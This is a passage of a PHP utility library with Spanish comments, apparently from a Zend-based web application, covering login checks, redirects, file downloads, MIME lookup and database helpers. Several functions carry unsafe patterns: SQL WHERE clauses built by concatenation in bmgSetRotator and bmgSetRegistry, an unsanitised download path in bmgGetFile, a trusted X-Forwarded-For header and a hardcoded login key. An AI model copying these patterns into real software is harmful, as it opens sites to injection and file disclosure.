          $error['pass']=$strError['error'];
        }
      }

    }else{
      if($isFunction)
      {
        $logged= 3; // no se encontro el registro
      }else{
        $error['error']=$strError['error'];
      }
    }

    if(count($error)>0)
    {
      $_SESSION['erroruser']=$error;
    }


    if($isService)
    {
      bmgGoBack();
    }


    return $logged;

  }

  function bmgLogged($key='usr')
  {

    if (isset($_SESSION[$key]))
    {
      if ($_SESSION[$key]['loginkey']=='W6PTO22V897WTZOEZG9SPK2EN2GU7ADU')
      {
        if($_SESSION['user_agent'] == $_SERVER['HTTP_USER_AGENT'])
        {
          return true;
        }
      }
    }
    return false;
  }

  function bmgLogoff($key='usr')
  {
    unset($_SESSION[$key]);
    unset($_SESSION['user_agent']);
  }


  function bmgUrlAmigable($texto)
  {
    $temp=mb_convert_case($texto, MB_CASE_LOWER, "UTF-8");
    $b1 = array();
    $nueva_cadena = '';

    $ent=array('&aacute;','&eacute;','&iacute;','&oacute;','&oacute;','&ntilde;');
    $entRep=array('á','é','í','ó','ú','ñ');

    $b=array('á','é','í','ó','ú','ä','ë','ï','ö','ü','à','è','ì','ò','ù','ñ',
    ',','.',';',':','¡','!','¿','?','"','_',
    'Á','É','Í','Ó','Ú','Ä','Ë','Ï','Ö','Ü','À','È','Ì','Ò','Ù','Ñ');
    $c=array('a','e','i','o','u','a','e','i','o','u','a','e','i','o','u','n',
    '' ,'' ,'' ,'' ,'' ,'' ,'' ,'' ,'','-',
    'a','e','i','o','u','a','e','i','o','u','a','e','i','o','u','ni');

    $temp=str_replace($ent,$entRep,$temp);
    $temp=str_replace($b,$c,$temp);
    $temp=str_replace($b1,$c,$temp);

    $new_cadena=explode(' ',$temp);

    foreach($new_cadena as $cad)
    {
      //$word = preg_replace("[^A-Za-z0-9]", "", $cad);
      $word=preg_replace('/[^A-Za-z0-9_-]+/', '', $cad);

      if (strlen($word)>0)
      {
        $nueva_cadena.=$word.'-';
      }
    }

    $nueva_cadena=substr($nueva_cadena,0,strlen($nueva_cadena)-1);

    return $nueva_cadena;
  }


	/**
	 * Uso: redirect('http://www.google.com');
	 */
  function bmgRedirect($url)
	{
    session_write_close();
		header("Location: ".$url); //.'/?'.SID
		exit();
	}

  function bmgGoBack()
	{
    if(isset($_SERVER['HTTP_REFERER']))
    {
      bmgRedirect($_SERVER['HTTP_REFERER']);
    }
		exit();
	}

  function bmgGoHome()
  {

    bmgRedirect(WEB_ROOT);

  }

  function bmgEliminarArticulos($cadena='')
  {
    $es_arts=array('el',
                     'él',
                     'la',
                     'los',
                     'las',
                     'los',
                     'lo',
                     'en',
                     'una',
                     'unos',
                     'unas',
                     'y',
                     'o',
                     'u',
                     'i',
                     'e',
                     'a',
                     'de',
                     'es',
                     'al',
                     'con',
                     'del',
                     'por','que',
                     'b','c','d','f','g','h','j','k',
                     'l','m','n','p','q','r','s','t','v','w','x','z'
                         );

    $en_arts=array('the','of','from','to','a','an','in','on','at','my','me',
                 'this','those','these','that','his','her','it','our',
                 'their','its','not','by','if','then','she','we','they',
                 'are','he','you','i');


    $new_cadena=array();

    if (strlen($cadena)==0)
    {
      return $new_cadena;
    }else{
    //	$cadena=strtolower(urlencode($cadena));

		$words=explode(' ',$cadena);

		$array_no_arts=array_diff($words,$es_arts);
		$array_no_arts=array_diff($array_no_arts,$en_arts);


      return $array_no_arts;
    }
  }

  /**
   * Recortar
   *
   * Recorta una cadena en función de una longitud dada
   * @param $text cadena a recortar
   * @param $size int longitud final de la cadena
   */

  function bmgRecortar($text,$size)
  {
    //$text = html_entity_decode($text, ENT_QUOTES);
    if (strlen($text) > $size)
    {
      $text = substr($text, 0, $size);
      $text = substr($text,0,strrpos($text," "));
      $etc = " ...";
      $text = $text.$etc;
    }
    //$text = htmlentities($text, ENT_QUOTES);
    return $text;
  }

  function bmgValidUrl($url)
  {
    return preg_match('|^http(s)?://[a-z0-9-]+(.[a-z0-9-]+)*(:[0-9]+)?(/.*)?$|i', $url);
  }

  function bmgSanitizeUrl($url)
  {
    $bloques=explode('.',$url);

    if($bloques[0]!='http://' || $bloques[0]!='https://')
    {
      $newUrl='http://'.$url;
    }

    return $newUrl;
  }

  function bmgToDecimal($number,$digits=2)
  {   
    return number_format(floatval($number), $digits, '.','');
  }

  function bmgToMoney($value,$simbolo=APP_MONEY,$useDecimals=true,$plain=false)
  {

    if($useDecimals)
    {
      if(defined('MONEY_DECIMALS'))
      {

        $moneyValue=bmgToDecimal($value,MONEY_DECIMALS);
      }else{
        $moneyValue=bmgToDecimal($value,2);
      }
    }
    else
    {
      $moneyValue=intval($value);
    }

    if($plain)
    {
      return $simbolo.' ' . $moneyValue;

    }else{
      return '<span class="app_money_simbol">'
          . $simbolo
          . '</span><span class="app_money_value">'
          . $moneyValue.'</span>';

    }

  }

  function bmgIP()
  {
    if (isset($_SERVER['HTTP_X_FORWARD_FOR']))
    {
      return $_SERVER['HTTP_X_FORWARD_FOR'];
    } else {
      return $_SERVER['REMOTE_ADDR'];
    }
  }


  /**
   * Convierte los nombres de archivo a nombres seguros
   *
   *@var file nombre del archivo a cambiar
   */
  function bmgFileSafeName($file)
  {
    $fileName = str_replace(array(' ', '-'), array('_','_'), $file);
    $fileName = preg_replace('/[^A-Za-z0-9_]/', '', $fileName) ;
    return $fileName;
  }

  /**
   * Convierte un objeto a un array
   */

  function bmgToObject($array)
  {
    if (is_array($array)) {

      $obj = new StdClass();
      foreach ($array as $key => $val){
        $obj->$key = $val;
      }
    }else {

      $obj = $array;
    }

    return $obj;
  }

  /**
   * Convierte un objecto stdClass a array
   */
  function bmgToArray($object) {

    if (is_object($object)) {

      foreach ($object as $key => $value) {
        $array[$key] = $value;
      }
    }else {
      $array = $object;
    }
    return $array;
  }

  function bmgNoCache()
  {
    header("Expires: Tue, 01 Jul 2001 06:00:00 GMT");
    header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
    header("Cache-Control: no-store, no-cache, must-revalidate");
    header("Cache-Control: post-check=0, pre-check=0", false);
    header("Pragma: no-cache");

  }


  function bmgIsValidUsername( $username )
  {

    return preg_match('/^[a-zA-Z0-9]+_?[a-zA-Z0-9]+$/D',$username);

  }


  function bmgSanitizeUser( $username, $strict = false )
  {
    $username = str_replace(' ', '', $username);

    return $username;
  }

  function urlRawDecode($raw_url_encoded)
  {
      # Hex conversion table
      $hex_table = array(
          0 => 0x00,
          1 => 0x01,
          2 => 0x02,
          3 => 0x03,
          4 => 0x04,
          5 => 0x05,
          6 => 0x06,
          7 => 0x07,
          8 => 0x08,
          9 => 0x09,
          "A"=> 0x0a,
          "B"=> 0x0b,
          "C"=> 0x0c,
          "D"=> 0x0d,
          "E"=> 0x0e,
          "F"=> 0x0f
      );

      # Fixin' latin character problem
          if(preg_match_all("/\%C3\%([A-Z0-9]{2})/i", $raw_url_encoded,$res))
          {
              $res = array_unique($res = $res[1]);
              $arr_unicoded = array();
              foreach($res as $key => $value){
                  $arr_unicoded[] = chr(
                          (0xc0 | ($hex_table[substr($value,0,1)]<<4))
                         | (0x03 & $hex_table[substr($value,1,1)])
                  );
                  $res[$key] = "%C3%" . $value;
              }

              $raw_url_encoded = str_replace(
                                      $res,
                                      $arr_unicoded,
                                      $raw_url_encoded
                          );
          }

          # Return decoded  raw url encoded data
          return rawurldecode($raw_url_encoded);
  }



  function bmgKillDir($directory, $empty=FALSE)
  {
    // if the path has a slash at the end we remove it here
    if(substr($directory,-1) == '/')
    {
      $directory = substr($directory,0,-1);
    }

    // if the path is not valid or is not a directory ...
    if(!file_exists($directory) || !is_dir($directory))
    {
      // ... we return false and exit the function
      return FALSE;

    // ... if the path is not readable
    }elseif(!is_readable($directory))
    {
      // ... we return false and exit the function
      return FALSE;

     // ... else if the path is readable
    }else{

      // we open the directory
      $handle = opendir($directory);

      // and scan through the items inside
      while (FALSE !== ($item = readdir($handle)))
      {
        // if the filepointer is not the current directory
        // or the parent directory
        if($item != '.' && $item != '..')
        {
          // we build the new path to delete
          $path = $directory.'/'.$item;

          // if the new path is a directory
          if(is_dir($path))
          {
            // we call this function with the new path
            bmgKillDir($path);

          // if the new path is a file
          }else{
            // we remove the file
            unlink($path);
          }
        }
      }

      // close the directory
      closedir($handle);

      // if the option to empty is not set to true
      if($empty == FALSE)
      {
        // try to delete the now empty directory
        if(!rmdir($directory))
        {
          // return false if not possible
          return FALSE;
        }
      }
       // return success
       return TRUE;
    }
  }

  function bmgRandomString($long,$onlynumbers=false)
  {

    $codigo = "";
    
    if($onlynumbers)
    {
    	$possible = "1234567890";	
    }else{
    	$possible = "123456789ABCDEFGHIJKLMNPQRSTUVWXYZ";
    }
    
    $i = 0;

    while ($i < $long) {
      $char = substr($possible, mt_rand(0, strlen($possible)-1), 1);
      $codigo .= $char;
      $i++;
    }
		
		if(!$onlynumbers)
		{
    	$codigo=str_replace('0','Z',$codigo);
		}

    return $codigo;
  }


  /**
   * Funciones para el rotador
   * Nombre de tabla "fw_rotator"
   * campos: codigo (int); id (int) ; info (int)
   */

  function bmgGetRotator($key)
  {
    global $db;

    $row=$db->fetchRow($db->select()->from('fw_rotator')
                                    ->where('keystring=?',$key));


    if($row)
    {
      return $row;
    }

    return 0;

  }

  function bmgSetRotator($key,$id)
  {
    global $db;

    if(intval($id)>0)
    {
      $data=array('id'=>$id);
    }else{
      $data=array('id'=>0);
    }

    $where="keystring='".$key."'";

    $db->update('fw_rotator',$data,$where);

  }

  /**
   * Leer el registro
   */

  function bmgGetRegistry($key,$appId=0,$table='fw_registry')
  {
    global $db;

    $row=$db->fetchRow($db->select()
                          ->from($table)
                          ->where('app_id=?',$appId)
                          ->where('clave=?',$key ));

    if($row)
    {
      return $row->valor;
    }

    return false;

  }

  /**
   * Escribir en el registro
   */

  function bmgSetRegistry($key,$value,$appId=0,$table='fw_registry')
  {
    global $db;

    $data=array('valor'=>$value);

    /*$where['clave = ?'] = (string)$key;
    $where['app_id = ?'] = $appId;*/

    $where = "clave = '" . $key . "' AND app_id = " . $appId ;

    $affected=$db->update($table,$data,$where);

    if($affected>0)
    {
      return true;

    }

    return false;

  }



  function bmgUrlActual()
  {
    $pageURL = 'http';

    if (isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] == "on")
    {
      $pageURL .= "s";
    }

    $pageURL .= "://";

    if ($_SERVER["SERVER_PORT"] != "80")
    {
      $pageURL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];

    }else{

      $pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
    }

    return $pageURL;
  }

  function bmgUtfToIso($utfText)
  {
    return mb_convert_encoding($utfText,"ISO-8859-1", "UTF-8"  );
  }

  function bmgIsoToUtf($isoText)
  {
    return mb_convert_encoding($isoText, "UTF-8","ISO-8859-1"  );
  }

  function bmgSecondsToTime($segundos)
  {

    $horas=floor($segundos/3600);

    $minutos=floor(($segundos%3600)/60);

    $segundos=(($segundos%3600)%60);

    $time=sprintf('%02s',$horas).':'.sprintf('%02s',$minutos).':'.sprintf('%02s',$segundos);

    return $time;

  }

  function bmgCebraColor()
  {
    $classColor=array(0=>'even',1=>'odd');
    $newColor=0;

    if(isset($_SESSION['_cebracolor']))
    {
      $newColor=abs(($_SESSION['_cebracolor']-1));

    }

    $_SESSION['_cebracolor']=$newColor;

    return $classColor[$newColor];

  }


  function bmgStrToHex($string)
  {
    $hex='';
    for ($i=0; $i < strlen($string); $i++)
    {
      $hex .= dechex(ord($string[$i]));
    }
    return $hex;
  }

  function bmgHexToStr($hex)
  {
    $string='';
    for ($i=0; $i < strlen($hex)-1; $i+=2)
    {
      $string .= chr(hexdec($hex[$i].$hex[$i+1]));
    }
    return $string;
  }

  function bmgGetPdf()
  {
    /* Direcciòn y nombre del archivo */

		$name=explode('-',bmgPrm(2));

		if(count($name)>1)
		{
		  $file=bmgFileSafeName(str_replace('-',DS,strtolower($name[1]))).'.pdf';
			$filename=DATA_DIR.DS.'file'.DS.$name[0].DS.$file;
		}
    else
		{
		  $file=bmgFileSafeName(str_replace('-',DS,strtolower(bmgPrm(2)))).'.pdf';
      $filename=DATA_DIR.DS.'file'.DS.$file;
		}

    if(bmgPrm(3)!='')
    {
      $fileTitle=bmgPrm(3).'.pdf';
    }else{
      $fileTitle=bmgPrm(2).'.pdf';
    }
   //echo $filename;exit();
    bmgDownloadFile($filename,'application/pdf',$fileTitle);

  }

  function bmgGetFile()
  {

    //  /svc/get-file/archivo_32_3333.pdf/titulo_del_archivo

    // Nombre y ruta del archivo
    $file=DATA_DIR.DS.str_replace('-',DS,bmgPrm(2));

    // Titulo del archivo
    $fileTitle=bmgPrm(3);

    // info de archivo
    $fileInfo=pathinfo($file);

    // Nombre base del archivo (file.ext)
    $filename=$fileInfo['basename'];

    // Verificar el titulo del archivo, si vacio, usar el nombre del
    // archivo fisico

    if($fileTitle!='')
    {
      $fileTitle.='.'.$fileInfo['extension'];

    }else{
      $fileTitle=$filename;
    }

    // Obtener el mime-type del archivo
    $mime=bmgGetMime($filename);

    // Enviar al archivo para descarga
    bmgDownloadFile($file,$mime,$fileTitle);

  }

  function bmgGetSwf()
  {
    $file=bmgFileSafeName(str_replace('-',DS,strtolower(bmgPrm(2)))).'.swf';

    /* Direcciòn y nombre del archivo */
    $filename=DATA_DIR.DS.'file'.DS.$file;

    if(file_exists($filename))
    {
      $strfile=file_get_contents($filename);

      header('Content-Type: application/x-shockwave-flash');
      header("Expires: Thu, 01 Jan 1970 00:00:00 GMT, -1 ");
      header("Cache-Control: no-cache, no-store, must-revalidate");
      header('Content-Length: ' . filesize($filename));
      header("Pragma: no-cache");

      echo $strfile;
    }else{
      header("HTTP/1.0 404 Not Found");
    }
  }


  function bmgGetMime($filename)
  {
    $mimes= array(
			'hqx'	=>	array('application/mac-binhex40', 'application/mac-binhex', 'application/x-binhex40', 'application/x-mac-binhex40'),
			'cpt'	=>	'application/mac-compactpro',
			'csv'	=>	array('text/x-comma-separated-values', 'text/comma-separated-values', 'application/octet-stream', 'application/vnd.ms-excel', 'application/x-csv', 'text/x-csv', 'text/csv', 'application/csv', 'application/excel', 'application/vnd.msexcel', 'text/plain'),
			'bin'	=>	array('application/macbinary', 'application/mac-binary', 'application/octet-stream', 'application/x-binary', 'application/x-macbinary'),
			'dms'	=>	'application/octet-stream',
			'lha'	=>	'application/octet-stream',
			'lzh'	=>	'application/octet-stream',
			'exe'	=>	array('application/octet-stream', 'application/x-msdownload'),
			'class'	=>	'application/octet-stream',
			'psd'	=>	array('application/x-photoshop', 'image/vnd.adobe.photoshop'),
			'so'	=>	'application/octet-stream',
			'sea'	=>	'application/octet-stream',
			'dll'	=>	'application/octet-stream',
			'oda'	=>	'application/oda',
			'pdf'	=>	array('application/pdf', 'application/force-download', 'application/x-download', 'binary/octet-stream'),
			'ai'	=>	array('application/pdf', 'application/postscript'),
			'eps'	=>	'application/postscript',
			'ps'	=>	'application/postscript',
			'smi'	=>	'application/smil',
			'smil'	=>	'application/smil',
			'mif'	=>	'application/vnd.mif',
			'xls'	=>	array('application/vnd.ms-excel', 'application/msexcel', 'application/x-msexcel', 'application/x-ms-excel', 'application/x-excel', 'application/x-dos_ms_excel', 'application/xls', 'application/x-xls', 'application/excel', 'application/download', 'application/vnd.ms-office', 'application/msword'),
			'ppt'	=>	array('application/powerpoint', 'application/vnd.ms-powerpoint', 'application/vnd.ms-office', 'application/msword'),
			'pptx'	=> 	array('application/vnd.openxmlformats-officedocument.presentationml.presentation', 'application/x-zip', 'application/zip'),
			'wbxml'	=>	'application/wbxml',
			'wmlc'	=>	'application/wmlc',
			'dcr'	=>	'application/x-director',
			'dir'	=>	'application/x-director',
			'dxr'	=>	'application/x-director',
			'dvi'	=>	'application/x-dvi',
			'gtar'	=>	'application/x-gtar',
			'gz'	=>	'application/x-gzip',
			'gzip'  =>	'application/x-gzip',
			'php'	=>	array('application/x-httpd-php', 'application/php', 'application/x-php', 'text/php', 'text/x-php', 'application/x-httpd-php-source'),
			'php4'	=>	'application/x-httpd-php',
			'php3'	=>	'application/x-httpd-php',
			'phtml'	=>	'application/x-httpd-php',
			'phps'	=>	'application/x-httpd-php-source',
			'js'	=>	array('application/x-javascript', 'text/plain'),
			'swf'	=>	'application/x-shockwave-flash',
			'sit'	=>	'application/x-stuffit',
			'tar'	=>	'application/x-tar',
			'tgz'	=>	array('application/x-tar', 'application/x-gzip-compressed'),
			'z'	=>	'application/x-compress',
			'xhtml'	=>	'application/xhtml+xml',
			'xht'	=>	'application/xhtml+xml',
			'zip'	=>	array('application/x-zip', 'application/zip', 'application/x-zip-compressed', 'application/s-compressed', 'multipart/x-zip'),
			'rar'	=>	array('application/x-rar', 'application/rar', 'application/x-rar-compressed'),
			'mid'	=>	'audio/midi',
			'midi'	=>	'audio/midi',
			'mpga'	=>	'audio/mpeg',
			'mp2'	=>	'audio/mpeg',
			'mp3'	=>	array('audio/mpeg', 'audio/mpg', 'audio/mpeg3', 'audio/mp3'),
			'aif'	=>	array('audio/x-aiff', 'audio/aiff'),
			'aiff'	=>	array('audio/x-aiff', 'audio/aiff'),
			'aifc'	=>	'audio/x-aiff',
			'ram'	=>	'audio/x-pn-realaudio',
			'rm'	=>	'audio/x-pn-realaudio',
			'rpm'	=>	'audio/x-pn-realaudio-plugin',
			'ra'	=>	'audio/x-realaudio',
			'rv'	=>	'video/vnd.rn-realvideo',
			'wav'	=>	array('audio/x-wav', 'audio/wave', 'audio/wav'),
			'bmp'	=>	array('image/bmp', 'image/x-bmp', 'image/x-bitmap', 'image/x-xbitmap', 'image/x-win-bitmap', 'image/x-windows-bmp', 'image/ms-bmp', 'image/x-ms-bmp', 'application/bmp', 'application/x-bmp', 'application/x-win-bitmap'),
			'gif'	=>	'image/gif',
			'jpeg'	=>	array('image/jpeg', 'image/pjpeg'),
			'jpg'	=>	array('image/jpeg', 'image/pjpeg'),
			'jpe'	=>	array('image/jpeg', 'image/pjpeg'),
			'jp2'	=>	array('image/jp2', 'video/mj2', 'image/jpx', 'image/jpm'),
			'j2k'	=>	array('image/jp2', 'video/mj2', 'image/jpx', 'image/jpm'),
			'jpf'	=>	array('image/jp2', 'video/mj2', 'image/jpx', 'image/jpm'),
			'jpg2'	=>	array('image/jp2', 'video/mj2', 'image/jpx', 'image/jpm'),
			'jpx'	=>	array('image/jp2', 'video/mj2', 'image/jpx', 'image/jpm'),
			'jpm'	=>	array('image/jp2', 'video/mj2', 'image/jpx', 'image/jpm'),
			'mj2'	=>	array('image/jp2', 'video/mj2', 'image/jpx', 'image/jpm'),
			'mjp2'	=>	array('image/jp2', 'video/mj2', 'image/jpx', 'image/jpm'),
			'png'	=>	array('image/png',  'image/x-png'),
			'tiff'	=>	'image/tiff',
			'tif'	=>	'image/tiff',
			'css'	=>	array('text/css', 'text/plain'),
			'html'	=>	array('text/html', 'text/plain'),
			'htm'	=>	array('text/html', 'text/plain'),
			'shtml'	=>	array('text/html', 'text/plain'),
			'txt'	=>	'text/plain',
			'text'	=>	'text/plain',
			'log'	=>	array('text/plain', 'text/x-log'),
			'rtx'	=>	'text/richtext',
			'rtf'	=>	'text/rtf',
			'xml'	=>	array('application/xml', 'text/xml', 'text/plain'),
			'xsl'	=>	array('application/xml', 'text/xsl', 'text/xml'),
			'mpeg'	=>	'video/mpeg',
			'mpg'	=>	'video/mpeg',
			'mpe'	=>	'video/mpeg',
			'qt'	=>	'video/quicktime',
			'mov'	=>	'video/quicktime',
			'avi'	=>	array('video/x-msvideo', 'video/msvideo', 'video/avi', 'application/x-troff-msvideo'),
			'movie'	=>	'video/x-sgi-movie',
			'doc'	=>	array('application/msword', 'application/vnd.ms-office'),
			'docx'	=>	array('application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'application/zip', 'application/msword', 'application/x-zip'),
			'dot'	=>	array('application/msword', 'application/vnd.ms-office'),
			'dotx'	=>	array('application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'application/zip', 'application/msword'),
			'xlsx'	=>	array('application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', 'application/zip', 'application/vnd.ms-excel', 'application/msword', 'application/x-zip'),
			'word'	=>	array('application/msword', 'application/octet-stream'),
			'xl'	=>	'application/excel',
			'eml'	=>	'message/rfc822',
			'json'  =>	array('application/json', 'text/json'),
			'pem'   =>	array('application/x-x509-user-cert', 'application/x-pem-file', 'application/octet-stream'),
			'p10'   =>	array('application/x-pkcs10', 'application/pkcs10'),
			'p12'   =>	'application/x-pkcs12',
			'p7a'   =>	'application/x-pkcs7-signature',
			'p7c'   =>	array('application/pkcs7-mime', 'application/x-pkcs7-mime'),
			'p7m'   =>	array('application/pkcs7-mime', 'application/x-pkcs7-mime'),
			'p7r'   =>	'application/x-pkcs7-certreqresp',
			'p7s'   =>	'application/pkcs7-signature',
			'crt'   =>	array('application/x-x509-ca-cert', 'application/x-x509-user-cert', 'application/pkix-cert'),
			'crl'   =>	array('application/pkix-crl', 'application/pkcs-crl'),
			'der'   =>	'application/x-x509-ca-cert',
			'kdb'   =>	'application/octet-stream',
			'pgp'   =>	'application/pgp',
			'gpg'   =>	'application/gpg-keys',
			'sst'   =>	'application/octet-stream',
			'csr'   =>	'application/octet-stream',
			'rsa'   =>	'application/x-pkcs7',
			'cer'   =>	array('application/pkix-cert', 'application/x-x509-ca-cert'),
			'3g2'   =>	'video/3gpp2',
			'3gp'   =>	array('video/3gp', 'video/3gpp'),
			'm4a'   =>	'audio/x-m4a',
			'f4v'   =>	array('video/mp4', 'video/x-f4v'),
			'flv'	  =>	'video/x-flv',
			'mp4'   =>  'video/mp4',
			'webm'	=>	'video/webm',
			'aac'   =>	'audio/x-acc',
			'm4u'   =>	'application/vnd.mpegurl',
			'm3u'   =>	'text/plain',
			'xspf'  =>	'application/xspf+xml',
			'vlc'   =>	'application/videolan',
			'wmv'   =>	array('video/x-ms-wmv', 'video/x-ms-asf'),
			'au'    =>	'audio/x-au',
			'ac3'   =>	'audio/ac3',
			'flac'  =>	'audio/x-flac',
			'ogg'   =>	array('audio/ogg', 'video/ogg', 'application/ogg'),
			'kmz'	=>	array('application/vnd.google-earth.kmz', 'application/zip', 'application/x-zip'),
			'kml'	=>	array('application/vnd.google-earth.kml+xml', 'application/xml', 'text/xml'),
			'ics'	=>	'text/calendar',
			'ical'	=>	'text/calendar',
			'zsh'	=>	'text/x-scriptzsh',
			'7zip'	=>	array('application/x-compressed', 'application/x-zip-compressed', 'application/zip', 'multipart/x-zip'),
			'cdr'	=>	array('application/cdr', 'application/coreldraw', 'application/x-cdr', 'application/x-coreldraw', 'image/cdr', 'image/x-cdr', 'zz-application/zz-winassoc-cdr'),
			'wma'	=>	array('audio/x-ms-wma', 'video/x-ms-asf'),
			'jar'	=>	array('application/java-archive', 'application/x-java-application', 'application/x-jar', 'application/x-compressed'),
			'svg'	=>	array('image/svg+xml', 'application/xml', 'text/xml'),
			'vcf'	=>	'text/x-vcard',
			'srt'	=>	array('text/srt', 'text/plain'),
			'vtt'	=>	array('text/vtt', 'text/plain'),
			'ico'	=>	array('image/x-icon', 'image/x-ico', 'image/vnd.microsoft.icon')
		);

    $ext = strtolower(array_pop(explode('.',$filename)));
    
    if ( !isset($mimes[$ext]))
    {
      $mime = 'application/octet-stream';
    }
    else
    {
      $mime = (is_array($mimes[$ext])) ? $mimes[$ext][0] : $mimes[$ext];
    }
    
    return $mime;
    
   
  }
  

  function bmgCreateFunctionName($cmd)
  {
    $funcName='';
    if($cmd!='')
    {
      $funcNameParts=explode('-',$cmd);

      $funcName=strtolower($funcNameParts[0]);

      for($x=1;$x<count($funcNameParts);$x++)
      {
        $funcName.=ucwords($funcNameParts[$x]);
      }
    }

    return $funcName;
  }

  function bmgLog($string,$proc=0)
  {
    global $db;

    $fecha = new Zend_Date();

    $db->insert('fw_log',array('fecha'=>$fecha->get('yyyy-MM-dd'),
                               'hora'=>$fecha->get('hh:mm:ss'),
                               'log'=>$string,
                               'proc'=>$proc
                               )
                            );

  }

  function bmgSetHistorial($historial = 'historial')
  {
    if($_SESSION[$historial][0] != bmgUrlActual())
    {
      $_SESSION[$historial][4] = @$_SESSION[$historial][3];
      $_SESSION[$historial][3] = @$_SESSION[$historial][2];
      $_SESSION[$historial][2] = @$_SESSION[$historial][1];
      $_SESSION[$historial][1] = @$_SESSION[$historial][0];
      $_SESSION[$historial][0] = bmgUrlActual();
    }
  }

  function bmgGetHistorial($key = 0, $historial = 'historial')
  {
    if(isset($_SESSION[$historial][$key]))
    {
      return $_SESSION[$historial][$key];
    }
    else
    {
      return WEB_ROOT;
    }
  }

  function bmgFormatBytes($size, $round = 0) {
    // -------------------------------------
    //   Converts from a size in bytes to a friendly display size
    // -------------------------------------
    $sizes = array('B', 'kB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
    for ($i=0; $size > 1024 && isset($sizes[$i+1]); $i++) $size /= 1024;
    return round($size,$round).'&nbsp;'.$sizes[$i];
  }

  function bmgAutoComplete($value = '', $length = 2, $char = '0')
  {
    if($value != '' && $length >= 2 && $char != '' && strlen($char) == 1)
    {
      $lenValue = strlen($value);

      if($lenValue >= $length)
      {
        return $value;
      }

      $valueComplete = '';

      $i = 1;

      while($i <= ($length - $lenValue))
      {
        $valueComplete.= $char;

        $i++;
      }

      $valueComplete.= $value;

      return $valueComplete;

    }
    return '0';
  }


  function getAtom($field, $value)
  {
    global $db;


    $select = $db->select()
								 ->from(TBL_ATOM);

		if(is_array($field))
		{
			foreach($field as $key => $val)
			{
				$select->where($key . ' =?', $val);
			}
		}
		elseif($field != '' AND $value != '')
		{
			$select->where($field . ' =?', $value);
		}
		else
		{
			return false;
		}


		$rs = $db->fetchAll($select);


		if($rs)
		{
      if(count($rs)==1)
      {
        return $rs[0];
      }

			return $rs;
		}

  }

  function bmgSendJson($obj)
  {
    header('Content-type: text/json');
    header('Content-type: application/json');
    echo Zend_Json::encode($obj);
  }

  /**
   * @return false if not cached or modified, true otherwise.
   * @param bool check_request set this to true if you want to check the client's request headers and "return" 304 if it makes sense. will only output the cache response headers otherwise.
   **/
  function sendHTTPCacheHeaders($cache_file_name, $check_request = false)
  {
  	$mtime = @filemtime($cache_file_name);

  	if($mtime > 0)
  	{
  		$gmt_mtime = gmdate('D, d M Y H:i:s', $mtime) . ' GMT';
  		$etag = sprintf('%08x-%08x', crc32($cache_file_name), $mtime);

  		header('ETag: "' . $etag . '"');
  		header('Last-Modified: ' . $gmt_mtime);
  		header('Cache-Control: private');
  		// we don't send an "Expires:" header to make clients/browsers use if-modified-since and/or if-none-match

  		if($check_request)
  		{
  			if(isset($_SERVER['HTTP_IF_NONE_MATCH']) && !empty($_SERVER['HTTP_IF_NONE_MATCH']))
  			{
  				$tmp = explode(';', $_SERVER['HTTP_IF_NONE_MATCH']); // IE fix!
  				if(!empty($tmp[0]) && strtotime($tmp[0]) == strtotime($gmt_mtime))
  				{
  					header('HTTP/1.1 304 Not Modified');
  					return false;
  				}
  			}

  			if(isset($_SERVER['HTTP_IF_NONE_MATCH']))
  			{
  				if(str_replace(array('\"', '"'), '', $_SERVER['HTTP_IF_NONE_MATCH']) == $etag)
  				{
  					header('HTTP/1.1 304 Not Modified');
  					return false;
  				}
  			}
  		}
  	}

  	return true;
  }


  function bmgIsValidYoutubeUrl($url)
  {
    $youtube_regexp = "/^(?:https?:\/\/)?(?:www\.)?(?:youtu\.be\/|youtube\.com\/(?:embed\/|v\/|watch\?v=|watch\?.+&v=))((\w|-){11})(?:\S+)?$/";

    $matches=array();

    preg_match($youtube_regexp, $url, $matches);


    $matches = array_filter($matches, returnMatch);

    // If we have 2 elements in array, it means we got a valid url!
    // $matches[2] is the youtube ID!
    if (sizeof($matches) >= 2) {
      return $matches;
    }

    return false;
  }
  //}

  function returnMatch($var)
  {
    return($var !== '');
  }

  if (!function_exists('bmgGetYtID')) {

    function bmgGetYtID($url)
    {
      $matches=bmgIsValidYoutubeUrl($url);

      if($matches!==false)
      {
        return $matches[1];
      }


    }

  }



  function bmgSanitizeFilename($f) {
    // a combination of various methods
    // we don't want to convert html entities, or do any url encoding
    // we want to retain the "essence" of the original file name, if possible
    // char replace table found at:
    // http://www.php.net/manual/en/function.strtr.php#98669
    $replace_chars = array(
      'Š'=>'S', 'š'=>'s', 'Ð'=>'Dj','Ž'=>'Z', 'ž'=>'z', 'À'=>'A', 'Á'=>'A', 'Â'=>'A', 'Ã'=>'A', 'Ä'=>'A',
      'Å'=>'A', 'Æ'=>'A', 'Ç'=>'C', 'È'=>'E', 'É'=>'E', 'Ê'=>'E', 'Ë'=>'E', 'Ì'=>'I', 'Í'=>'I', 'Î'=>'I',
      'Ï'=>'I', 'Ñ'=>'N', 'Ò'=>'O', 'Ó'=>'O', 'Ô'=>'O', 'Õ'=>'O', 'Ö'=>'O', 'Ø'=>'O', 'Ù'=>'U', 'Ú'=>'U',
      'Û'=>'U', 'Ü'=>'U', 'Ý'=>'Y', 'Þ'=>'B', 'ß'=>'Ss','à'=>'a', 'á'=>'a', 'â'=>'a', 'ã'=>'a', 'ä'=>'a',
      'å'=>'a', 'æ'=>'a', 'ç'=>'c', 'è'=>'e', 'é'=>'e', 'ê'=>'e', 'ë'=>'e', 'ì'=>'i', 'í'=>'i', 'î'=>'i',
      'ï'=>'i', 'ð'=>'o', 'ñ'=>'n', 'ò'=>'o', 'ó'=>'o', 'ô'=>'o', 'õ'=>'o', 'ö'=>'o', 'ø'=>'o', 'ù'=>'u',
      'ú'=>'u', 'û'=>'u', 'ý'=>'y', 'ý'=>'y', 'þ'=>'b', 'ÿ'=>'y', 'ƒ'=>'f'
    );
    $f = strtr($f, $replace_chars);
    // convert & to "and", @ to "at", and # to "number"
